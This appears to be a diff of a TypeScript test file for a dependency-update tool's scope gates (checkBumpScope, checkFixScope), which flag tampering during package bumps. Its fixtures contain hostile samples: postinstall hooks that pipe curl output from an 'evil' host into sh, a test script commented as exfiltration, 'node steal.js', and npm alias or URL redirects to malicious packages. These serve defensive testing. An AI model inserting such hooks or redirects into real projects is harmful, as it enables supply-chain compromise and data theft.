@@ -3,261 +3,8 @@ import assert from "node:assert/strict";
 import { execSync } from "node:child_process";
 import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
-import {
-  checkDiffScope,
-  packageJsonCatalogProtocolChanges,
-  packageJsonGuardedFieldChanges,
-  pnpmWorkspaceCatalogViolations,
-  scopeViolations,
-} from "../src/core/scope.ts";
-
-test("denies CI config, git hooks, and package-manager config anywhere in the tree", () => {
-  const violations = scopeViolations([
-    ".github/workflows/evil.yml",
-    ".husky/pre-commit",
-    ".npmrc",
-    "packages/app/.npmrc",
-    ".yarnrc.yml",
-    ".pnpmfile.cjs",
-    "packages/app/.pnpmfile.cjs",
-    "pnpm-workspace.yaml",
-    ".yarn/plugins/evil.cjs",
-    "bunfig.toml",
-    "src/index.ts",
-    "package.json",
-  ]);
-  assert.deepEqual(violations, [
-    ".github/workflows/evil.yml",
-    ".husky/pre-commit",
-    ".npmrc",
-    "packages/app/.npmrc",
-    ".yarnrc.yml",
-    ".pnpmfile.cjs",
-    "packages/app/.pnpmfile.cjs",
-    "pnpm-workspace.yaml",
-    ".yarn/plugins/evil.cjs",
-    "bunfig.toml",
-  ]);
-});
-
-test("normal update artifacts pass", () => {
-  assert.deepEqual(
-    scopeViolations(["package.json", "package-lock.json", "pnpm-lock.yaml", "src/cache.ts"]),
-    [],
-  );
-});
-
-test("guarded fields: version-only bumps do not count, scripts edits do", () => {
-  const base = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test"},"dependencies":{"lru-cache":"^10.0.0"}}`;
-  // Only a dependency version moved — guarded fields untouched.
-  const bump = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test"},"dependencies":{"lru-cache":"^11.0.0"}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, bump), []);
-
-  // An injected lifecycle hook.
-  const hooked = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test","postinstall":"curl evil.sh | sh"},"dependencies":{"lru-cache":"^11.0.0"}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, hooked), ["scripts"]);
-
-  // A rewritten existing script (exfiltrate during verification).
-  const rewritten = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test && curl evil"}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, rewritten), ["scripts"]);
-
-  // Absent-on-both and unparseable are treated as absent → no change.
-  assert.deepEqual(packageJsonGuardedFieldChanges(`{}`, `{}`), []);
-  assert.deepEqual(packageJsonGuardedFieldChanges(`not json`, `{}`), []);
-});
-
-test("guarded fields: packageManager, pnpm, and override fields are tamper-checked", () => {
-  const base = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`;
-
-  // corepack executes whatever binary this field names.
-  const swappedPm = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"packageManager":"pnpm@1.0.0"}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, swappedPm), ["packageManager"]);
-
-  // pnpm settings: overrides / onlyBuiltDependencies / patchedDependencies.
-  const pnpmField = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"pnpm":{"onlyBuiltDependencies":["evil"]}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, pnpmField), ["pnpm"]);
-
-  // Dependency-source redirection.
-  const overrides = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"overrides":{"dep":"github:evil/dep"}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, overrides), ["overrides"]);
-
-  const resolutions = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"resolutions":{"dep":"1.0.1"}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, resolutions), ["resolutions"]);
-});
-
-test("guarded fields: bun's trust, patch, and catalog fields are tamper-checked", () => {
-  const base = `{"name":"x","dependencies":{"dep":"1.0.0"}}`;
-
-  // Grants install-time code execution to a dependency.
-  const trusted = `{"name":"x","dependencies":{"dep":"2.0.0"},"trustedDependencies":["dep"]}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, trusted), ["trustedDependencies"]);
-
-  // Injects arbitrary code into an installed dependency.
-  const patched = `{"name":"x","dependencies":{"dep":"2.0.0"},"patchedDependencies":{"dep@2.0.0":"patches/dep.patch"}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, patched), ["patchedDependencies"]);
-
-  // bun keeps catalogs in package.json — under workspaces or at the top level.
-  const nested = `{"name":"x","dependencies":{"dep":"2.0.0"},"workspaces":{"catalog":{"dep":"2.0.0"}}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, nested), ["workspaces"]);
-  const topLevel = `{"name":"x","dependencies":{"dep":"2.0.0"},"catalog":{"dep":"2.0.0"},"catalogs":{"grp":{"dep":"2.0.0"}}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, topLevel), ["catalog", "catalogs"]);
-});
-
-test("guarded fields: key reordering alone is not a change", () => {
-  const base = `{"scripts":{"build":"tsc","test":"node --test"},"pnpm":{"overrides":{"a":"1","b":"2"}}}`;
-  const reordered = `{"pnpm":{"overrides":{"b":"2","a":"1"}},"scripts":{"test":"node --test","build":"tsc"}}`;
-  assert.deepEqual(packageJsonGuardedFieldChanges(base, reordered), []);
-});
-
-test("catalog protocol specs in package.json must be preserved", () => {
-  const base = `{
-    "dependencies": { "semver": "catalog:", "left-pad": "1.1.0" },
-    "devDependencies": { "@types/node": "catalog:types" }
-  }`;
-  assert.deepEqual(
-    packageJsonCatalogProtocolChanges(
-      base,
-      `{
-        "dependencies": { "semver": "7.7.3", "left-pad": "catalog:" },
-        "devDependencies": { "@types/node": "catalog:types" }
-      }`,
-    ),
-    ['dependencies: "semver" catalog protocol', 'dependencies: "left-pad" catalog protocol'],
-  );
-  assert.deepEqual(packageJsonCatalogProtocolChanges(base, base), []);
-});
-
-const CATALOG_ALLOWED = new Map([["semver", "7.7.3"]]);
-
-test("catalog carve-out: a member's catalog bump to the vetted version passes", () => {
-  const before = "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n";
-  // Exact, caret, and tilde forms of the vetted target are all sanctioned.
-  for (const spec of ["7.7.3", "^7.7.3", "~7.7.3"]) {
-    const after = `packages:\n  - packages/*\ncatalog:\n  semver: ${spec}\n`;
-    assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), []);
-  }
-});
-
-test("catalog carve-out: named catalogs get the same treatment", () => {
-  const before = "packages:\n  - packages/*\ncatalogs:\n  default:\n    semver: ^7.3.0\n";
-  const after = "packages:\n  - packages/*\ncatalogs:\n  default:\n    semver: ^7.7.3\n";
-  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), []);
-  // A brand-new named catalog is not a version bump.
-  const added = before + "  evil:\n    semver: ^7.7.3\n";
-  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, added, CATALOG_ALLOWED), [
-    'pnpm-workspace.yaml (catalogs: "evil" added)',
-  ]);
-});
-
-test("catalog carve-out: non-catalog changes stay denied", () => {
-  const before =
-    "packages:\n  - packages/*\nonlyBuiltDependencies:\n  - esbuild\ncatalog:\n  semver: ^7.3.0\n";
-  // Version bump rides along with a build-script grant and a source override.
-  const after =
-    "packages:\n  - packages/*\n  - evil/*\nonlyBuiltDependencies:\n  - esbuild\n  - evil\n" +
-    "overrides:\n  dep: github:evil/dep\ncatalog:\n  semver: ^7.7.3\n";
-  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), [
-    "pnpm-workspace.yaml (packages)",
-    "pnpm-workspace.yaml (onlyBuiltDependencies)",
-    "pnpm-workspace.yaml (overrides)",
-  ]);
-});
-
-test("catalog carve-out: entry add/remove, non-members, and off-target versions are denied", () => {
-  const before = "catalog:\n  semver: ^7.3.0\n  chalk: ^4.1.2\n";
-  // Added + removed entries.
-  assert.deepEqual(
-    pnpmWorkspaceCatalogViolations(
-      before,
-      "catalog:\n  semver: ^7.7.3\n  evil: ^1.0.0\n",
-      CATALOG_ALLOWED,
-    ),
-    [
-      'pnpm-workspace.yaml (catalog: "chalk" removed)',
-      'pnpm-workspace.yaml (catalog: "evil" added)',
-    ],
-  );
-  // A package the group is not updating.
-  assert.deepEqual(
-    pnpmWorkspaceCatalogViolations(
-      before,
-      "catalog:\n  semver: ^7.3.0\n  chalk: ^5.6.2\n",
-      CATALOG_ALLOWED,
-    ),
-    ['pnpm-workspace.yaml (catalog: "chalk")'],
-  );
-  // A member moved to a version other than the vetted target (incl. wider ranges).
-  for (const spec of ["^7.9.9", ">=7.7.3", "7.7.3 || ^8.0.0", "*"]) {
-    assert.deepEqual(
-      pnpmWorkspaceCatalogViolations(
-        before,
-        `catalog:\n  semver: "${spec}"\n  chalk: ^4.1.2\n`,
-        CATALOG_ALLOWED,
-      ),
-      ['pnpm-workspace.yaml (catalog: "semver")'],
-    );
-  }
-});
-
-test("catalog carve-out: prototype-named catalog entries are still own keys", () => {
-  const before = "catalog:\n  semver: ^7.3.0\n";
-  const allowed = new Map([
-    ["semver", "7.7.3"],
-    ["constructor", "1.0.0"],
-  ]);
-  assert.deepEqual(
-    pnpmWorkspaceCatalogViolations(
-      before,
-      "catalog:\n  semver: ^7.7.3\n  constructor: 1.0.0\n",
-      allowed,
-    ),
-    ['pnpm-workspace.yaml (catalog: "constructor" added)'],
-  );
-});
-
-test("catalog carve-out: dependency-source redirection is structurally impossible", () => {
-  const before = "catalog:\n  semver: ^7.3.0\n";
-  for (const spec of [
-    "npm:evil@7.7.3",
-    "github:evil/semver",
-    "https://evil.tld/semver-7.7.3.tgz",
-    "file:../evil",
-    "link:../evil",
-  ]) {
-    assert.deepEqual(
-      pnpmWorkspaceCatalogViolations(before, `catalog:\n  semver: "${spec}"\n`, CATALOG_ALLOWED),
-      ['pnpm-workspace.yaml (catalog: "semver")'],
-    );
-  }
-});
-
-test("catalog carve-out: illegible YAML and file creation/deletion fail closed", () => {
-  const before = "catalog:\n  semver: ^7.3.0\n";
-  assert.deepEqual(pnpmWorkspaceCatalogViolations(null, before, CATALOG_ALLOWED), [
-    "pnpm-workspace.yaml (created)",
-  ]);
-  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, null, CATALOG_ALLOWED), [
-    "pnpm-workspace.yaml (deleted)",
-  ]);
-  // Unparseable, non-map root, and duplicate keys (yaml throws) on the new side.
-  for (const after of ["{ not yaml", "- a\n- b\n", "catalog:\n  semver: 1\n  semver: 2\n"]) {
-    assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), [
-      "pnpm-workspace.yaml (unparseable)",
-    ]);
-  }
-  // A non-map catalog section.
-  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, "catalog: []\n", CATALOG_ALLOWED), [
-    "pnpm-workspace.yaml (catalog is not a map)",
-  ]);
-});
-
-test("catalog carve-out: comment/format-only changes compare by parsed value", () => {
-  const before = "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n";
-  // pnpm's own rewrite may reflow the file; comments carry no pnpm semantics.
-  const after = "# managed by depvisor\npackages: [packages/*]\ncatalog: { semver: ^7.7.3 }\n";
-  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), []);
-});
+import { dirname, join } from "node:path";
+import { checkBumpScope, checkFixScope } from "../src/core/scope.ts";
 
 function repoWithBaseline(pkg: string): string {
   const repo = mkdtempSync(join(tmpdir(), "depvisor-scope-"));
@@ -270,124 +17,323 @@ function repoWithBaseline(pkg: string): string {
   return repo;
 }
 
-test("checkDiffScope flags an injected postinstall in an otherwise-clean bump", () => {
-  const repo = repoWithBaseline(
-    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`,
-  );
-  // A legitimate-looking version bump that smuggles a lifecycle hook.
-  writeFileSync(
-    join(repo, "package.json"),
-    `{"scripts":{"test":"node --test","postinstall":"node steal.js"},"dependencies":{"dep":"2.0.0"}}`,
-  );
-  writeFileSync(join(repo, "src.ts"), "export const x = 1;\n");
-  const scope = checkDiffScope(repo, "HEAD");
+// checkFixScope is the fixer-path gate: the bump already happened deterministically
+// (its commit is HEAD), so the fixer may only touch source/tests — ANY dependency
+// state (manifest, lockfile, workspace/catalog file) is a violation.
+
+test("checkFixScope denies any manifest, lockfile, and workspace-file change", () => {
+  const repo = repoWithBaseline(`{"dependencies":{"dep":"2.0.0"}}`);
+  // The bump commit is HEAD; the fixer then dirties the working tree.
+  writeFileSync(join(repo, "package.json"), `{"dependencies":{"dep":"3.0.0"}}`); // manifest re-edit
+  writeFileSync(join(repo, "package-lock.json"), `{"lockfileVersion":3}`); // new lockfiles
+  writeFileSync(join(repo, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+  writeFileSync(join(repo, "bun.lock"), "{}\n");
+  writeFileSync(join(repo, "pnpm-workspace.yaml"), "packages: []\n");
+  writeFileSync(join(repo, "src.ts"), "export const fixed = 1;\n"); // the one legit change
+  const scope = checkFixScope(repo, "HEAD");
   assert.equal(scope.ok, false);
-  assert.deepEqual(scope.violations, ["package.json (scripts)"]);
+  assert.deepEqual(scope.violations.sort(), [
+    "bun.lock",
+    "package-lock.json",
+    "package.json",
+    "pnpm-lock.yaml",
+    "pnpm-workspace.yaml",
+  ]);
+  assert.ok(!scope.violations.includes("src.ts"), "a source fix is in scope");
 });
 
-test("checkDiffScope passes a version-only bump with source fixes", () => {
-  const repo = repoWithBaseline(
-    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`,
-  );
-  writeFileSync(
-    join(repo, "package.json"),
-    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"}}`,
-  );
+test("checkFixScope inherits the DENY list and catches nested manifests", () => {
+  const repo = repoWithBaseline(`{"name":"root"}`);
+  mkdirSync(join(repo, ".github/workflows"), { recursive: true });
+  writeFileSync(join(repo, ".github/workflows/evil.yml"), "on: push\n");
+  writeFileSync(join(repo, ".npmrc"), "registry=http://evil\n");
+  mkdirSync(join(repo, "packages/a"), { recursive: true });
+  writeFileSync(join(repo, "packages/a/package.json"), `{"name":"a"}`);
+  const scope = checkFixScope(repo, "HEAD");
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations.sort(), [
+    ".github/workflows/evil.yml",
+    ".npmrc",
+    "packages/a/package.json",
+  ]);
+});
+
+test("checkFixScope passes when the fixer only touched source and tests", () => {
+  const repo = repoWithBaseline(`{"name":"root"}`);
   writeFileSync(join(repo, "src.ts"), "export const adapted = true;\n");
-  assert.deepEqual(checkDiffScope(repo, "HEAD"), { ok: true, violations: [] });
+  mkdirSync(join(repo, "test"), { recursive: true });
+  writeFileSync(join(repo, "test/a.test.ts"), "// adapted assertion\n");
+  assert.deepEqual(checkFixScope(repo, "HEAD"), { ok: true, violations: [] });
 });
 
-test("checkDiffScope: catalogBumps opts pnpm-workspace.yaml into the carve-out", () => {
-  const repo = repoWithBaseline(`{"name":"root","private":true}`);
+test("checkFixScope folds in changes committed since sinceRef (HEAD advanced past the bump)", () => {
+  const repo = repoWithBaseline(`{"name":"root"}`);
   const sh = (cmd: string) => execSync(cmd, { cwd: repo });
-  writeFileSync(
-    join(repo, "pnpm-workspace.yaml"),
-    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
-  );
+  const since = execSync("git rev-parse HEAD", { cwd: repo }).toString().trim();
+  // Simulate the fixer COMMITTING a manifest edit (advancing HEAD past the bump
+  // commit); changedPaths alone would miss it, so the sinceRef diff must fold in.
+  writeFileSync(join(repo, "package.json"), `{"name":"root","dependencies":{"x":"1.0.0"}}`);
   sh("git add -A");
-  sh("git -c user.email=t@t -c user.name=t commit -qm add-workspace-yaml");
-  writeFileSync(
-    join(repo, "pnpm-workspace.yaml"),
-    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.7.3\n",
-  );
+  sh("git -c user.email=t@t -c user.name=t commit -qm fixer-committed-a-manifest-edit");
+  const scope = checkFixScope(repo, since);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json"]);
+});
 
-  // Without the opt-in (non-pnpm targets), the flat deny stands.
-  assert.deepEqual(checkDiffScope(repo, "HEAD"), {
-    ok: false,
-    violations: ["pnpm-workspace.yaml"],
+// checkBumpScope is the bump-path gate: it runs on the working-tree diff against
+// base BEFORE the mechanical bump is committed, and allows ONLY genuine version
+// moves of the group's own members in the files that enter that commit. It
+// exists to catch an install lifecycle script that rewrote a manifest beyond the
+// update itself (which would otherwise ride along in the "mechanical" commit).
+
+function bumpRepo(baseFiles: Record<string, string>): string {
+  const repo = mkdtempSync(join(tmpdir(), "depvisor-bumpscope-"));
+  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
+  sh("git init -q");
+  for (const [name, content] of Object.entries(baseFiles)) writeInto(repo, name, content);
+  sh("git add -A");
+  sh("git -c user.email=t@t -c user.name=t commit -qm baseline");
+  return repo;
+}
+
+function writeInto(repo: string, name: string, content: string): void {
+  const path = join(repo, name);
+  mkdirSync(dirname(path), { recursive: true });
+  writeFileSync(path, content);
+}
+
+test("checkBumpScope passes a legal npm-style bump (member version moved, lockfile changed)", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+    "package-lock.json": JSON.stringify({ lockfileVersion: 3 }),
   });
-  // With it, the sanctioned bump passes …
-  assert.deepEqual(checkDiffScope(repo, "HEAD", { catalogBumps: CATALOG_ALLOWED }), {
+  writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": "^1.3.0" } }));
+  writeInto(repo, "package-lock.json", JSON.stringify({ lockfileVersion: 3, refreshed: true }));
+  assert.deepEqual(checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []), {
     ok: true,
     violations: [],
   });
-  // … but only for the group's own packages at the vetted version.
-  assert.deepEqual(checkDiffScope(repo, "HEAD", { catalogBumps: new Map([["semver", "7.9.9"]]) }), {
-    ok: false,
-    violations: ['pnpm-workspace.yaml (catalog: "semver")'],
+});
+
+test("checkBumpScope denies a scripts change smuggled alongside the bump", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({
+      dependencies: { "left-pad": "^1.0.0" },
+      scripts: { build: "tsc" },
+    }),
   });
+  writeInto(
+    repo,
+    "package.json",
+    JSON.stringify({
+      dependencies: { "left-pad": "^1.3.0" },
+      scripts: { build: "tsc", postinstall: "curl evil | sh" },
+    }),
+  );
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json#scripts"]);
 });
 
-test("checkDiffScope: pnpm catalog carve-out does not allow de-cataloging package.json", () => {
-  const repo = repoWithBaseline(`{"name":"root","private":true}`);
-  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
-  mkdirSync(join(repo, "packages/a"), { recursive: true });
-  writeFileSync(
-    join(repo, "pnpm-workspace.yaml"),
-    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
-  );
-  writeFileSync(
-    join(repo, "packages/a/package.json"),
-    `{"name":"a","dependencies":{"semver":"catalog:"}}`,
-  );
-  sh("git add -A");
-  sh("git -c user.email=t@t -c user.name=t commit -qm add-catalog-workspace");
-  writeFileSync(
-    join(repo, "pnpm-workspace.yaml"),
-    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.7.3\n",
-  );
-  writeFileSync(
-    join(repo, "packages/a/package.json"),
-    `{"name":"a","dependencies":{"semver":"7.7.3"}}`,
-  );
-
-  assert.deepEqual(checkDiffScope(repo, "HEAD", { catalogBumps: CATALOG_ALLOWED }), {
-    ok: false,
-    violations: ['packages/a/package.json (dependencies: "semver" catalog protocol)'],
+test("checkBumpScope denies an added dependency key", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
   });
+  writeInto(
+    repo,
+    "package.json",
+    JSON.stringify({ dependencies: { "left-pad": "^1.3.0", evil: "*" } }),
+  );
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.evil"]);
 });
 
-test("checkDiffScope catches a guarded field in a package.json under a NEW untracked dir", () => {
-  // git collapses a brand-new untracked directory to `packages/evil/`, so a
-  // basename-keyed guarded-field check never sees the package.json inside — an
-  // agent could smuggle a `postinstall` (later committed by commitAll) past the
-  // gate. changedPaths lists untracked files individually (--untracked-files=all).
-  const repo = repoWithBaseline(`{"name":"root","private":true}`);
-  mkdirSync(join(repo, "packages/evil"), { recursive: true });
-  writeFileSync(
-    join(repo, "packages/evil/package.json"),
-    `{"name":"evil","scripts":{"postinstall":"node steal.js"}}`,
+test("checkBumpScope denies a non-member version change", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0", chalk: "^4.0.0" } }),
+  });
+  writeInto(
+    repo,
+    "package.json",
+    JSON.stringify({ dependencies: { "left-pad": "^1.3.0", chalk: "^5.0.0" } }),
   );
-  const scope = checkDiffScope(repo, "HEAD");
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
-  assert.deepEqual(scope.violations, ["packages/evil/package.json (scripts)"]);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.chalk"]);
 });
 
-test("checkDiffScope catches guarded-field tampering under a non-ASCII workspace path", () => {
-  // Non-`-z` porcelain C-quotes such a path, and the escaped string reads as a
-  // nonexistent file on BOTH sides of the diff — a guarded `scripts` injection
-  // in that workspace slipped through the gate unseen.
-  const repo = repoWithBaseline(`{"name":"root","private":true}`);
-  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
-  mkdirSync(join(repo, "パッケージ"));
-  writeFileSync(join(repo, "パッケージ/package.json"), `{"name":"ws","version":"1.0.0"}`);
-  sh("git add -A");
-  sh("git -c user.email=t@t -c user.name=t commit -qm add-workspace");
-  writeFileSync(
-    join(repo, "パッケージ/package.json"),
-    `{"name":"ws","version":"1.0.0","scripts":{"postinstall":"node steal.js"}}`,
-  );
-  const scope = checkDiffScope(repo, "HEAD");
+test("checkBumpScope denies a member value that does not carry latest", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+  });
+  writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": "^1.2.9" } }));
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
-  assert.deepEqual(scope.violations, ["パッケージ/package.json (scripts)"]);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
+});
+
+test("checkBumpScope denies a de-catalog (catalog: reference rewritten to a plain version)", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { semver: "catalog:" } }),
+  });
+  // A de-catalog carries latest, but the OLD value was a catalog: reference, so
+  // it is still a violation (the executor's mistaken de-catalog vector).
+  writeInto(repo, "package.json", JSON.stringify({ dependencies: { semver: "7.7.3" } }));
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.semver"]);
+});
+
+test("checkBumpScope denies a newly created package.json (install script planting a manifest)", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+  });
+  writeInto(repo, "packages/evil/package.json", JSON.stringify({ scripts: { postinstall: "x" } }));
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["packages/evil/package.json (new)"]);
+});
+
+test("checkBumpScope denies an unparseable package.json", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+  });
+  writeInto(repo, "package.json", "{ not json");
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json (unparseable)"]);
+});
+
+test("checkBumpScope passes a legal pnpm-workspace.yaml catalog move (default + named)", () => {
+  const repo = bumpRepo({
+    "pnpm-workspace.yaml": "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
+    "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
+  });
+  writeInto(repo, "pnpm-workspace.yaml", "packages:\n  - packages/*\ncatalog:\n  semver: ^7.7.3\n");
+  writeInto(repo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\nrefreshed: true\n");
+  assert.deepEqual(
+    checkBumpScope(
+      repo,
+      "HEAD",
+      [{ name: "semver", latest: "7.7.3" }],
+      [{ name: "semver", target: "7.7.3", catalog: null }],
+    ),
+    { ok: true, violations: [] },
+  );
+});
+
+test("checkBumpScope passes a named-catalog member move", () => {
+  const repo = bumpRepo({ "pnpm-workspace.yaml": "catalogs:\n  react:\n    react: ^18.0.0\n" });
+  writeInto(repo, "pnpm-workspace.yaml", "catalogs:\n  react:\n    react: ^19.0.0\n");
+  assert.deepEqual(
+    checkBumpScope(
+      repo,
+      "HEAD",
+      [{ name: "react", latest: "19.0.0" }],
+      [{ name: "react", target: "19.0.0", catalog: "react" }],
+    ),
+    { ok: true, violations: [] },
+  );
+});
+
+test("checkBumpScope denies non-catalog pnpm-workspace.yaml changes (packages / onlyBuiltDependencies)", () => {
+  const repo = bumpRepo({
+    "pnpm-workspace.yaml": "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
+  });
+  writeInto(
+    repo,
+    "pnpm-workspace.yaml",
+    "packages:\n  - packages/*\n  - tools/*\ncatalog:\n  semver: ^7.7.3\nonlyBuiltDependencies:\n  - esbuild\n",
+  );
+  const scope = checkBumpScope(
+    repo,
+    "HEAD",
+    [{ name: "semver", latest: "7.7.3" }],
+    [{ name: "semver", target: "7.7.3", catalog: null }],
+  );
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations.sort(), [
+    "pnpm-workspace.yaml#onlyBuiltDependencies",
+    "pnpm-workspace.yaml#packages",
+  ]);
+});
+
+test("checkBumpScope denies an alias redirect that carries the target version", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+  });
+  // `npm:evil@1.3.0` contains the vetted "1.3.0" but redirects the dependency
+  // to a different package — the strict whole-string grammar must reject it
+  // (and with it every git:/file:/link:/URL specifier).
+  writeInto(
+    repo,
+    "package.json",
+    JSON.stringify({ dependencies: { "left-pad": "npm:evil@1.3.0" } }),
+  );
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
+});
+
+test("checkBumpScope denies a compound range even when it contains the target", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+  });
+  // Only the exact/caret/tilde shapes the PM commands write are legal; an
+  // exotic range fails closed rather than widening the grammar.
+  writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": ">=1.3.0 <2" } }));
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
+});
+
+test("checkBumpScope denies a change in a catalog the plan did not target", () => {
+  const repo = bumpRepo({
+    "pnpm-workspace.yaml": "catalog:\n  semver: ^7.3.0\ncatalogs:\n  legacy:\n    semver: ^7.3.0\n",
+  });
+  // The plan edited only the default catalog; the same-named entry in the
+  // unreferenced `legacy` catalog changed too (an alias redirect, even) — that
+  // is not the executor's write and must be a violation.
+  writeInto(
+    repo,
+    "pnpm-workspace.yaml",
+    "catalog:\n  semver: ^7.7.3\ncatalogs:\n  legacy:\n    semver: npm:evil@7.7.3\n",
+  );
+  const scope = checkBumpScope(
+    repo,
+    "HEAD",
+    [{ name: "semver", latest: "7.7.3" }],
+    [{ name: "semver", target: "7.7.3", catalog: null }],
+  );
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["pnpm-workspace.yaml#catalogs.legacy.semver"]);
+});
+
+test("checkBumpScope allows a default-catalog edit landing in catalogs.default", () => {
+  const repo = bumpRepo({
+    "pnpm-workspace.yaml": "catalogs:\n  default:\n    semver: ^7.3.0\n",
+  });
+  // pnpm treats `catalog:` as sugar for `catalog:default`, and the executor
+  // resolves a default edit to catalogs.default when no top-level catalog map
+  // exists — the gate must accept the same landing spot.
+  writeInto(repo, "pnpm-workspace.yaml", "catalogs:\n  default:\n    semver: ^7.7.3\n");
+  assert.deepEqual(
+    checkBumpScope(
+      repo,
+      "HEAD",
+      [{ name: "semver", latest: "7.7.3" }],
+      [{ name: "semver", target: "7.7.3", catalog: null }],
+    ),
+    { ok: true, violations: [] },
+  );
+});
+
+test("checkBumpScope denies an unparseable pnpm-workspace.yaml", () => {
+  const repo = bumpRepo({ "pnpm-workspace.yaml": "catalog:\n  semver: ^7.3.0\n" });
+  // A YAML sequence root is not a plain map → illegible → fail-closed.
+  writeInto(repo, "pnpm-workspace.yaml", "- just\n- a\n- list\n");
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }], []);
+  assert.equal(scope.ok, false);
